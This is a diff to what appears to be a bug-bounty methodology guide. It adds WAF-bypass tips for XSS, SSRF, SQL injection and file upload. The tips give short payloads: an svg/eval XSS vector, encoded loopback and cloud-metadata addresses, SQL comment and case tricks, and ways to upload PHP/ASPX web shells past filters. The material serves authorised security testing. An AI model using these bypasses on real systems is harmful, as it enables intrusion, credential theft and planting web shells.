@@ -139,6 +139,8 @@ location.href = userInput
 - XSS + service worker = persistent XSS across pages
 - XSS + credential theft via fake login form = ATO
 
+**WAF bypass for XSS**: Run `tools/waf_encoder.py "<payload>" --class xss` to get 20+ variants (HTML entity, unicode escape, base64-wrapped). Try `<svg onload=eval(atob('...'))>` or `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` when `<script>` is blocked. Probe which chars are allowed by testing individually, then construct payload from unblocked chars.
+
 ---
 
 ## 4. SSRF — SERVER-SIDE REQUEST FORGERY
@@ -187,6 +189,8 @@ http://localhost:8080     # Admin panel
 - Internal service accessible = Medium
 - Cloud metadata = High (key exposure)
 - Cloud metadata + exfil keys = Critical
+
+**WAF bypass for SSRF**: If WAF blocks `127.0.0.1`/`169.254.169.254`, try `2130706433` (decimal), `0x7f000001` (hex), `[::1]` (IPv6), `[::ffff:127.0.0.1]` (IPv4-mapped), `127.0.0.1.nip.io` (DNS rebind), or `127。0。0。1` (full-width period U+3002). Run payload through `tools/waf_encoder.py "<payload>" --class generic`.
 
 ---
 
@@ -287,6 +291,8 @@ grep -rn "\.query(" --include="*.js" --include="*.ts" | grep "\+"
 grep -rn "mysql_query\|mysqli_query" --include="*.php" | grep "\$"
 ```
 
+**WAF bypass for SQLi**: Run `tools/waf_encoder.py "<payload>" --class sqli` for comment-injection (`SE/**/LECT`), MySQL version comment (`/*!50000 UNION*/`), case-mix (`SeLeCt`), operator substitute (`OR`→`||`, `=`→`LIKE`), whitespace swap (`%0a`, `%0b`, `/**/ `). AWS WAF specifically: try `/**/` between every token. ModSecurity: try `/*!50000 UNION*/` + `%0a` space substitution.
+
 ---
 
 ## 8. OAUTH / OIDC BUGS
@@ -362,6 +368,8 @@ filename=shell.phtml, shell.pHp, shell.php5   → extension variants
   <script>alert(document.domain)</script>
 </svg>
 ```
+
+**WAF bypass for file upload**: Run `tools/multipart_mutator.py --file shell.aspx --field file` for 10 parser-confusion variants (boundary simplification, double-boundary case-insensitive confusion, charset=utf-16le part encoding, null-byte in boundary, Content-Disposition sub-param injection, per-part image/jpeg Content-Type). Combine with polyglot (GIF89a magic bytes + PHP payload). RFC 2231 filename: `filename*=utf-8''shell.php`. MIME Base64: `filename="=?utf-8?b?c2hlbGwucGhw?="`.
 
 ---
 
